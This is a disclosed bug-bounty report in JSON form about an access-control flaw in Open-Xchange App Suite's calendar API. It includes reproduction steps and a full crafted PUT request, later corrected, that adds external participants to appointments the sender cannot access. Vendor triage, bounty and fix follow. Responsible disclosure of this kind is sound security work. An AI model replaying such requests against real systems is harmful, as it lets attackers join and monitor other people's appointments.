{"id":294232,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTQyMzI=","url":"https://hackerone.com/reports/294232","title":"Adding external participants to unaccessible appointments","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-12-01T14:00:57.520Z","submitted_at":"2017-12-01T14:00:57.520Z","is_member_of_team?":false,"reporter":{"disabled":true,"username":"mishre","url":"/mishre","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-07-04T11:26:57.711Z","bug_reporter_agreed_on_going_public_at":"2019-07-04T11:26:57.591Z","team_member_agreed_on_going_public_at":"2019-07-04T11:16:18.938Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Description\nWhen making an appointment users are able to invite additional participants which do not have an open-xchange account. However, it appears than any user can invite external participants to any appointment even this appointment is not accessible for him. Additionaly using the same bug anyone can mark external participant's confirmation status in any appointment.\n\n## Steps to reproduce\n1. Login as user1 and go to calendar -\u003e add new calendar and add a calendar.\n2. In the created calendar create an appointment by clicking new and filling in the details, while creating the appointment capture the request using an interceptor and after receiving the response copy the id value in it - this is the created appointment's id.\n3. Logout and login with user2\n4. By browsing the site find a valid value for the sessionid parameter sent along with any request and then send the following request (as user2:\n\n```\nPUT https://sandbox.open-xchange.com/appsuite/api/calendar?action=confirm\u0026folder={folder-id-which-you-have-access-to}\u0026id={id-of-appointment}\u0026session={copied-sessionid}\u0026timestamp=2116800000000\u0026timezone=UTC HTTP/1.1\nHost: sandbox.open-xchange.com\nConnection: keep-alive\nContent-Length: 89\nAccept: application/json, text/javascript, */*; q=0.01\nOrigin: https://sandbox.open-xchange.com\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\nContent-Type: text/javascript; charset=UTF-8\nReferer: https://sandbox.open-xchange.com/appsuite/ui\nAccept-Encoding: gzip, deflate, br\nAccept-Language: he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6\nCookie: {redacted}\n\n{\"confirmmessage\":\"\",\"confirmation\":1, \"type\":5, \"email\":\"testingmichaelreiz1@gmail.com\"}\n```\n\nFill in the correct parameters. For the folder value use a folder which is writeable by user2.\n\n5) Login again as user1 and see that testingmichaelreiz1@gmail.com was added to the appointment as an external participant. by changing the confirmation value to 0 it is also possible to mark external participants as uncofirmed.\n\n## Root cause\nThere is no validation that the appointment is actually present in the folder specified in the request, and the permission to add/edit external participants is validated only on the folder parameter instead of the appointment's id itself.\n\n## Impact\n\nSince the appointment ids are sequential (1,2,3..) an attacker may add himself to any appointment on the instance and be notified about anything happening inside.","vulnerability_information_html":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eWhen making an appointment users are able to invite additional participants which do not have an open-xchange account. However, it appears than any user can invite external participants to any appointment even this appointment is not accessible for him. Additionaly using the same bug anyone can mark external participant\u0026#39;s confirmation status in any appointment.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eLogin as user1 and go to calendar -\u0026gt; add new calendar and add a calendar.\u003c/li\u003e\n\u003cli\u003eIn the created calendar create an appointment by clicking new and filling in the details, while creating the appointment capture the request using an interceptor and after receiving the response copy the id value in it - this is the created appointment\u0026#39;s id.\u003c/li\u003e\n\u003cli\u003eLogout and login with user2\u003c/li\u003e\n\u003cli\u003eBy browsing the site find a valid value for the sessionid parameter sent along with any request and then send the following request (as user2:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePUT https://sandbox.open-xchange.com/appsuite/api/calendar?action=confirm\u0026amp;folder={folder-id-which-you-have-access-to}\u0026amp;id={id-of-appointment}\u0026amp;session={copied-sessionid}\u0026amp;timestamp=2116800000000\u0026amp;timezone=UTC HTTP/1.1\nHost: sandbox.open-xchange.com\nConnection: keep-alive\nContent-Length: 89\nAccept: application/json, text/javascript, */*; q=0.01\nOrigin: https://sandbox.open-xchange.com\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\nContent-Type: text/javascript; charset=UTF-8\nReferer: https://sandbox.open-xchange.com/appsuite/ui\nAccept-Encoding: gzip, deflate, br\nAccept-Language: he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6\nCookie: {redacted}\n\n{\u0026quot;confirmmessage\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;confirmation\u0026quot;:1, \u0026quot;type\u0026quot;:5, \u0026quot;email\u0026quot;:\u0026quot;testingmichaelreiz1@gmail.com\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFill in the correct parameters. For the folder value use a folder which is writeable by user2.\u003c/p\u003e\n\n\u003cp\u003e5) Login again as user1 and see that \u003ca title=\"testingmichaelreiz1@gmail.com\" href=\"mailto:testingmichaelreiz1@gmail.com\" rel=\"nofollow noopener noreferrer\"\u003etestingmichaelreiz1@gmail.com\u003c/a\u003e was added to the appointment as an external participant. by changing the confirmation value to 0 it is also possible to mark external participants as uncofirmed.\u003c/p\u003e\n\n\u003ch2 id=\"root-cause\"\u003eRoot cause\u003c/h2\u003e\n\n\u003cp\u003eThere is no validation that the appointment is actually present in the folder specified in the request, and the permission to add/edit external participants is validated only on the folder parameter instead of the appointment\u0026#39;s id itself.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eSince the appointment ids are sequential (1,2,3..) an attacker may add himself to any appointment on the instance and be notified about anything happening inside.\u003c/p\u003e\n","bounty_amount":"300.0","formatted_bounty":"$300","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":6,"voters":["sameerphad72","mygf","eveeez","cr4xerbik4sh","cryptographer","delta30"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":551,"asset_type":"URL","asset_identifier":"sandbox.open-xchange.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2193768,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Thanks for the report, are you sure this report is complete? When executing the provided steps i end up with a SQL exception as the \"confirm\" request payload contains unexpected content.","markdown_message":"\u003cp\u003eThanks for the report, are you sure this report is complete? When executing the provided steps i end up with a SQL exception as the \u0026quot;confirm\u0026quot; request payload contains unexpected content.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-01T14:36:06.298Z","updated_at":"2017-12-01T14:36:06.298Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2193794,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Oups,\nApparently I have mistakenly copied an incorrect parameter name in step 4.\nPlease set the request as below:\n\n```\nPUT https://sandbox.open-xchange.com/appsuite/api/calendar?action=confirm\u0026folder={folder-id-which-you-have-access-to}\u0026id={id-of-appointment}\u0026session={copied-sessionid}\u0026timestamp=2116800000000\u0026timezone=UTC HTTP/1.1\nHost: sandbox.open-xchange.com\nConnection: keep-alive\nContent-Length: 89\nAccept: application/json, text/javascript, */*; q=0.01\nOrigin: https://sandbox.open-xchange.com\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\nContent-Type: text/javascript; charset=UTF-8\nReferer: https://sandbox.open-xchange.com/appsuite/ui\nAccept-Encoding: gzip, deflate, br\nAccept-Language: he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6\nCookie: {redacted}\n\n{\"confirmmessage\":\"\",\"confirmation\":1, \"type\":5, \"mail\":\"testingmichaelreiz1@gmail.com\"}\n```\n\nnote that the parameter email from my original report is now mail (without e).","markdown_message":"\u003cp\u003eOups,\u003cbr\u003e\nApparently I have mistakenly copied an incorrect parameter name in step 4.\u003cbr\u003e\nPlease set the request as below:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePUT https://sandbox.open-xchange.com/appsuite/api/calendar?action=confirm\u0026amp;folder={folder-id-which-you-have-access-to}\u0026amp;id={id-of-appointment}\u0026amp;session={copied-sessionid}\u0026amp;timestamp=2116800000000\u0026amp;timezone=UTC HTTP/1.1\nHost: sandbox.open-xchange.com\nConnection: keep-alive\nContent-Length: 89\nAccept: application/json, text/javascript, */*; q=0.01\nOrigin: https://sandbox.open-xchange.com\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\nContent-Type: text/javascript; charset=UTF-8\nReferer: https://sandbox.open-xchange.com/appsuite/ui\nAccept-Encoding: gzip, deflate, br\nAccept-Language: he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6\nCookie: {redacted}\n\n{\u0026quot;confirmmessage\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;confirmation\u0026quot;:1, \u0026quot;type\u0026quot;:5, \u0026quot;mail\u0026quot;:\u0026quot;testingmichaelreiz1@gmail.com\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003enote that the parameter email from my original report is now mail (without e).\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-01T14:50:15.016Z","updated_at":"2017-12-01T14:50:15.016Z","actor":{"username":"mishre","cleared":false,"url":"/mishre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2193837,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.\n\nWe'll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories \"researcher credits\"?","markdown_message":"\u003cp\u003eThanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories \u0026quot;researcher credits\u0026quot;?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-01T15:10:29.612Z","updated_at":"2017-12-01T15:10:29.612Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2193840,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, It would be nice to be credited as Michael Reizelman.","markdown_message":"\u003cp\u003eYes, It would be nice to be credited as Michael Reizelman.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-01T15:11:32.868Z","updated_at":"2017-12-01T15:11:32.868Z","actor":{"username":"mishre","cleared":false,"url":"/mishre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2193847,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-01T15:14:32.759Z","updated_at":"2017-12-01T15:14:32.759Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2193896,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for looking into this kind of vector!","markdown_message":"\u003cp\u003eThanks for looking into this kind of vector!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-01T15:32:59.836Z","updated_at":"2017-12-01T15:32:59.836Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"300.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"mishre","url":"/mishre"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2257797,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We solved this vulnerability internally and will provide a backport to in-production releases during the next weeks.","markdown_message":"\u003cp\u003eWe solved this vulnerability internally and will provide a backport to in-production releases during the next weeks.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-03T09:38:12.935Z","updated_at":"2018-01-03T09:38:12.935Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mishre","url":"/mishre"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5253130,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-04T11:16:19.025Z","updated_at":"2019-07-04T11:16:19.025Z","first_to_agree":true,"actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5253400,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-04T11:26:57.642Z","updated_at":"2019-07-04T11:26:57.642Z","actor":{"username":"mishre","cleared":false,"url":"/mishre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5253401,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-04T11:26:57.737Z","updated_at":"2019-07-04T11:26:57.737Z","actor":{"username":"mishre","cleared":false,"url":"/mishre","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}